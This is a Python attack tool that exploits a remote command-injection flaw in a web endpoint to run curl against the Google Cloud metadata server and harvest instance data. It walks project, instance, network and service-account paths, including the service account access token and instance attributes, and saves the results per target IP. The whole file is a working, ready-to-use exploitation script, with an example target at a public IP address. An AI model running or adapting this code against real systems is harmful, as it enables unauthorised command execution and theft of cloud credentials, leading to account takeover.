import argparse
import requests
import urllib.parse
import json
import os
import re
from urllib.parse import urlparse
from collections import defaultdict

METADATA_BASE_URL = 'http://metadata.google.internal/computeMetadata/v1'

METADATA_PATHS = {
    "project": [
        "project/project-id",
        "project/numeric-project-id",
        "project/project-number",
        "project/attributes/"
    ],
    "instance": [
        "instance/hostname",
        "instance/id",
        "instance/name",
        "instance/zone",
        "instance/machine-type",
        "instance/description",
        "instance/tags",
        "instance/attributes/",
        "instance/creation-timestamp",
        "instance/cpu-platform",
        "instance/scheduling/",
        "instance/maintenance-event"
    ],
    "disks": [
        "instance/disks/",
        "instance/disks/0/device-name",
        "instance/disks/0/index",
        "instance/disks/0/type",
        "instance/disks/0/interface"
    ],
    "network": [
        "instance/network-interfaces/",
        "instance/network-interfaces/0/ip",
        "instance/network-interfaces/0/network",
        "instance/network-interfaces/0/subnetmask",
        "instance/network-interfaces/0/gateway",
        "instance/network-interfaces/0/access-configs/0/external-ip"
    ],
    "shielded-instance": [
        "instance/shielded-instance/",
        "instance/shielded-instance/enabled",
        "instance/shielded-instance/secure-boot",
        "instance/shielded-instance/vtpm-enabled",
        "instance/shielded-instance/integrity-monitoring-enabled"
    ],
    "service-accounts": [
        "instance/service-accounts/",
        "instance/service-accounts/default/",
        "instance/service-accounts/default/email",
        "instance/service-accounts/default/scopes",
        "instance/service-accounts/default/aliases",
        "instance/service-accounts/default/token"
    ],
}

def build_curl_command(path):
    full_url = f"{METADATA_BASE_URL}/{path.lstrip('/')}"
    return f'curl -H "Metadata-Flavor: Google" {full_url}'


def sanitize_filename(name):
    return re.sub(r'[<>:"/\\|?*\n\r\t]', '_', name)

def save_value(base_dir, category, full_path, value):
    parts = full_path.split('/')

    # Remove known prefixes like 'instance', 'project'
    if parts[0] in METADATA_PATHS:
        parts = parts[1:]

    # Remove category again if it’s repeated
    if parts[0] == category:
        parts = parts[1:]

    # Sanitize folders and filename
    *folders, filename = [sanitize_filename(p) for p in parts]
    folders = [sanitize_filename(f) for f in folders]

    dir_path = os.path.join(base_dir, category, *folders)
    os.makedirs(dir_path, exist_ok=True)

    if '.' not in filename:
        if isinstance(value, str) and '\n' in value:
            v = value.strip()
            if v.startswith("#cloud-config") or v.startswith("#cloud-init"):
                ext = ".yaml"
            elif "[Unit]" in v and "[Service]" in v:
                ext = ".service"
            elif v.startswith("#!") or "bash" in v or v.startswith("echo ") or "function " in v:
                ext = ".sh"
            elif v.startswith("{") or v.startswith("["):
                ext = ".json"
            else:
                ext = ".txt"
        else:
            ext = ".json"
        filename += ext

    file_path = os.path.join(dir_path, filename)

    if isinstance(value, (dict, list)):
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(value, f, indent=4)
    else:
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(str(value))

    print(f"[DEBUG] Saved to: {file_path}")
    return file_path

def clean_response(raw_text):
    html_markers = ['<!DOCTYPE', '<html', '<HTML', '<!doctype']
    for marker in html_markers:
        index = raw_text.find(marker)
        if index != -1:
            raw_text = raw_text[:index]
            break
    return raw_text.strip()

def inject_command(template_url, cmd):
    if "CHECK" not in template_url:
        raise ValueError("The URL must contain 'CHECK' placeholder for injection.")

    full_url = template_url.replace("CHECK", urllib.parse.quote(cmd))
    print(f"[DEBUG] Fetching URL: {full_url}")
    try:
        response = requests.get(full_url, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")
        text = response.text.strip()

        # Only retry with trailing slash if original response is empty
        if response.status_code == 200 and not text and not full_url.rstrip('/').endswith('.json'):
            parts = cmd.split()
            url = parts[-1]
            if not url.endswith('/'):
                url_slash = url + '/'
                cmd_slash = " ".join(parts[:-1] + [url_slash])
                retry_url = template_url.replace("CHECK", urllib.parse.quote(cmd_slash))
                print(f"[DEBUG] Retrying with trailing slash: {retry_url}")
                retry_resp = requests.get(retry_url, timeout=10)
                print(f"[DEBUG] Retry status: {retry_resp.status_code}")
                return retry_resp.text.strip()

        return text
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return None

def fetch_and_process(path, base_cmd_path, category_data, base_dir, category_name, args):
    # Build full path correctly, avoiding duplicate slashes
    if base_cmd_path:
        full_path = f"{base_cmd_path.rstrip('/')}/{path.lstrip('/')}"
    else:
        full_path = path.lstrip('/')
    print(f"\n[>] Fetching metadata for path: /{full_path}")
    cmd = build_curl_command(full_path)
    raw_output = inject_command(args.url, cmd)

    if not raw_output:
        alt_path = full_path.rstrip('/') if full_path.endswith('/') else full_path + '/'
        if alt_path != full_path:
            print(f"[!] No data for /{full_path}, retrying with alternative path /{alt_path}...")
            cmd = build_curl_command(alt_path)
            raw_output = inject_command(args.url, cmd)
            full_path = alt_path

    if not raw_output:
        print(f"[!] Failed to fetch path: /{full_path}")
        return

    cleaned_output = clean_response(raw_output)

    try:
        parsed = json.loads(cleaned_output)
    except json.JSONDecodeError:
        parsed = cleaned_output

    # If string with multiple lines and path ends with '/', treat as directory listing and recurse
    if isinstance(parsed, str) and '\n' in parsed and full_path.endswith('/'):
        sub_paths = [line.strip().rstrip('/') for line in parsed.splitlines() if line.strip()]
        sub_data = {}
        for sub in sub_paths:
            full_sub_path = f"{full_path.rstrip('/')}/{sub}"
            fetch_and_process(full_sub_path, "", sub_data, base_dir, category_name, args)
        category_data[path] = sub_data
    else:
        THRESHOLD = 200
        if args.save:
            content_str = json.dumps(parsed) if isinstance(parsed, (dict, list)) else str(parsed)
            if len(content_str) > THRESHOLD:
                file_name = save_value(base_dir, category_name, full_path, parsed)
                category_data[path] = {"file": file_name}
            else:
                category_data[path] = {"value": parsed}
        else:
            if isinstance(parsed, (dict, list)):
                print(json.dumps(parsed, indent=2))
            else:
                print(parsed)

def save_json(data, base_dir, category, path):
    filename = path.replace("/", "_").replace("-", "_") + ".json"
    dir_path = os.path.join(base_dir, category)
    os.makedirs(dir_path, exist_ok=True)
    full_path = os.path.join(dir_path, filename)
    with open(full_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)
    print(f"[DEBUG] Saved JSON to: {full_path}")

def main():
    parser = argparse.ArgumentParser(description="GCP Metadata Extractor via Remote Command Injection")
    parser.add_argument("--url", required=True, help="Target URL with CHECK placeholder (e.g., http://34.42.232.208/?cmd=CHECK)")
    parser.add_argument("--category", help="Metadata category to fetch (e.g., instance, project)")
    parser.add_argument("--path", help="Specific metadata path to fetch (overrides --category)")
    parser.add_argument("--all", action="store_true", help="Fetch all metadata paths across all categories")
    parser.add_argument("--save", action="store_true", help="Save output(s) to JSON files")
    parser.add_argument("--project", help="Project name (required if --save is set)")
    args = parser.parse_args()

    if args.save and not args.project:
        parser.error("--project is required when --save is used.")

    parsed_url = urlparse(args.url)
    target_ip = parsed_url.hostname or "unknown_target"

    base_dir = None
    if args.save:
        base_dir = os.path.join(os.getcwd(), args.project, target_ip)

    if args.all:
        paths_to_fetch = []
        for cat_paths in METADATA_PATHS.values():
            paths_to_fetch.extend(cat_paths)
    elif args.path:
        paths_to_fetch = [args.path]
    elif args.category:
        cat_paths = METADATA_PATHS.get(args.category)
        if not cat_paths:
            print(f"[!] Category '{args.category}' not found.")
            return
        paths_to_fetch = cat_paths
    else:
        parser.error("You must specify one of --category, --path, or --all")

    print(f"[+] Target URL: {args.url}")
    print(f"[+] Save Mode: {'Enabled' if args.save else 'Disabled'}")
    print(f"[+] Paths to fetch: {paths_to_fetch}")
    print("=" * 60)

    category_data = defaultdict(dict)

    for path in paths_to_fetch:
        category_name = None
        for cat, paths in METADATA_PATHS.items():
            if path in paths:
                category_name = cat
                break
        if category_name is None:
            category_name = "misc"

        if args.save:
            os.makedirs(os.path.join(base_dir, category_name), exist_ok=True)

        fetch_and_process(path, "", category_data[category_name], base_dir, category_name, args)

    if args.save:
        for category, data in category_data.items():
            save_json(data, base_dir, category, "metadata")

    print("\n[+] Metadata extraction complete.")

if __name__ == "__main__":
    main()